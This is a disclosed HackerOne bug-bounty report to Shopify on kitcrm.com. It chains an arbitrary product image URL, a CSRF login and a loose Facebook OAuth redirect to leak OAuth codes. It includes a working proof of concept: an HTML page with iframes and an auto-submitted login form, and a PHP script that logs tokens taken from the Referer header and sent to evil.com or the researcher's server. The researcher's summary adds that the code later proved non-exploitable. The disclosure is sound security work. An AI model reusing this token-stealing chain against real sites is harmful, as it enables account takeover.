{
  "id": 211477,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTE0Nzc=",
  "url": "https://hackerone.com/reports/211477",
  "title": "Stealing users' facebook access tokens - kitcrm.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-03-08T00:06:17.999Z",
  "submitted_at": "2017-03-08T00:06:17.999Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zombiehelp54",
    "url": "/zombiehelp54",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-03-15T21:45:59.073Z",
  "bug_reporter_agreed_on_going_public_at": "2017-03-15T21:45:59.016Z",
  "team_member_agreed_on_going_public_at": "2017-03-14T21:04:13.504Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nI have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user's facebook access token provided for kitcrm.com\n\n**Description:**\n- In kitcrm.com, users register with their shopify account and the products in their store appear in **Priority Products** section.\n- When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.\n- Users can set their product image to anything, for example `http://evil.com/` will be accepted and added as the product image.\n- Now each time the user visits `https://www.kitcrm.com/seller/onboarding/1`, the page will request `http://evil.com/` as an image.\n- In `https://[shop].myshopify.com` there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)\n- Users of `kitcrm.com` are authenticated automatically by visiting the endpoint `https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com` which redirects to `https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....` then they are redirected back to `kitcrm.com` and logged in.\n- Current `redirect_uri` configuration for Kitcrm facebook oauth application allows redirection to `https://www.kitcrm.com/<ANYTHING>`\n\nChaining all of what I mentioned above together, here is how an attacker will be able to steal users' facebook access tokens: \n\n- An attacker registers a shopify store and then uses it to register a `kitcrm.com` account.\n- After that he modifies his priority product image url to `https://evil.com/log_token.php`\n- Then he tricks the victim into visiting a specially crafted HTML page that will:\n   - CSRF login the victim into the attacker's store\n   - CSRF login the victim into `kitcrm.com` \n   - Redirect the victim to `https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type....` which will redirect him back to `https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]`\n- After the victim is redirected from facebook to kitcrm.com, a request will be sent to `https://evil.com/log_token.php` with the user's CSRF token in the referrer header.\n- Now the attacker can store the token at his server and use it to access the user's facebook account.\n\n**Proof of concept:**\nI have created a live proof of concept that does all of that and stores the access token at `tokens.log` file. \nIt can be found here: https://alazzazpp.com/shopify/steal.html (Please note that you should allow your browser to access `https://alazzazpp.com` with https since it doesn't have a valid SSL certificate.) \nAlso, here is a PoC video:\n{F167006}\n\n**PoC Code:**\n> Steal.html\n\n```html\n<script>\nwindow.onload = function () { \n  window.setTimeout(function() {\n              document.getElementById(\"token\").innerHTML = \"<iframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'></iframe>\";   \n          }, 5000);\n          window.setTimeout(function() {\n               window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');\n          }, 10000);\nfinished = 0;\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200 && this.responseText.length > 0) {\n     document.getElementById(\"token\").innerHTML = \"<b>Your access token is: <br></b>\" +this.responseText;\n     alert(this.responseText);\n     finished = 1;\n   }\n };\nfunction fetchToken(){ \n xhttp.open(\"GET\", \"tokens.log?\"+Math.random(), true);\n xhttp.send();\n if (finished == 1){\n   clearInterval(interval);\n }\n}\nvar interval = setInterval(function(){ fetchToken() } , 10000);\n}\n</script>\n<h4>If no window was opened click <a href=\"https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages\" target=\"_blank\">here</a>: \n\n<div id=\"token\"><h3>Your access token should appear soon.....</h3></div>\n<iframe src='data:text/html,<form action=\"https://zh5409.myshopify.com/admin/auth/login\" method=\"post\">\n<input name=\"utf8\" value=\"\"><input name=\"redirect\"><input name=\"highlight=><input name=\"subdomain\" value=zh5409><input name=\"login\" value=███><input name=\"password\" value=P@ss123lol><input name=\"[remember]\" value=1>\n</form><script>document.forms[0].submit()</script>'></iframe>\n<div id=\"csrf_login\"></div>\n```\n\n> log_token.php\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\n$referrer = $_SERVER['HTTP_REFERER'];\n$token = substr($referrer, strpos($referrer, \"=\") + 1);    \n$fp = fopen('tokens.log', 'w');\nfwrite($fp, $token.\"\\n\");\nfclose($fp);\n?>\n```\n\n**Recommended fix:**\nMitigation of this vulnerability is pretty simple, just set your facebook oauth application `redirect_uri` to the exact callback endpoint and remove the domain from the white list.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 25,
  "voters": [
    "delimitry",
    "drsniper",
    "bogdantcaciuc",
    "kapytein",
    "supernatural",
    "mpz",
    "muhammad_uwais",
    "eveeez",
    "xhzeem",
    "kiraak-boy",
    "and 15 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 3534,
      "category": "researcher",
      "content": "Chaining minor bugs with no impact at all to steal facebook codes.\nMore to add here: Through this bug an attacker could steal `code` returned from facebook not the `access_token` itself.\nThe exploitation scenario I thought of was to use that code through `kitcrm.com` to access the victim's account and take advantage of granted permissions, however, after a conversation in Bug Bounty Forums turned out that facebook now requires validation for the exact `redirect_uri` used when obtaining the code (https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode) which makes this bug not exploitable since the `redirect_uri` used when the attacker obtained the code does not match the one the application sends to facebook server-side when obtaining the `access_token`.\n\n",
      "user": {
        "id": 36135,
        "username": "zombiehelp54",
        "name": "Mahmoud G. ",
        "bio": "Twitter: @Zombiehelp54 ",
        "cleared": false,
        "verified": true,
        "website": "https://mahmoudsec.blogspot.com",
        "location": "",
        "created_at": "2015-07-07T10:16:23.553Z",
        "url": "https://hackerone.com/zombiehelp54",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
